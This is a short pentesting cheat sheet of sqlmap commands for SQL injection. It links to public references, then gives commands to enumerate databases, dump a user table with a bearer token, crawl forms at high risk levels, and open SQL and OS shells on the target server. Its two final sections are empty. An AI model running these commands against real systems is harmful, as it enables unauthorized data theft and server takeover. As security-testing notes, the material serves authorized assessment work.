

#### Reference
[DeepWiki SQL Inject CheatSheet](https://deepwiki.com/EdOverflow/bugbounty-cheatsheet/2.2.3-sql-injection-(sqli))
[WebSecWordPress Advance SQL Injections](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/)
[PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt) – list auth for sql brute force authentication

[SQL Injection - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)

[SQLMap - CheatSheet - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/index.html)

## SQLMap Commands
#### SQLMap with Request File
```bash
# Save the request on Burp as req.txt
token='Authoriation: Bearer ey...'

sqlmap -r /tmp/req2.txt --batch --headers=$token --dump
```
#### SQLMap using URL
```bash
sqlmap -u "https://test.com/?email=eu%40om&password=123" --method GET --data -p "email,password"
```
#### Crawl a website and test for SQL Injection
Not had good results yet, as it takes too long
```bash
token='Authoriation: Bearer ey...'
sqlmap -u $url --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --headers=$token --dbms=sqlite
```
#### Most used SQLMap Commands
```bash
# Sholl all available Databases
sqlmap -r request --dbs

# Look inside a database called ai and show tables
sqlmap -r request -D ai --tables

# Look inside the ai database table user and dump results
sqlmap -r request -D ai -T user --dump

# Attempt to get a shell on the server
sqlmap -r request --batch --sql-shell
sqlmap -r request --batch --os-shell

#

```
# SQL Boolean Check



# SQL UNION Check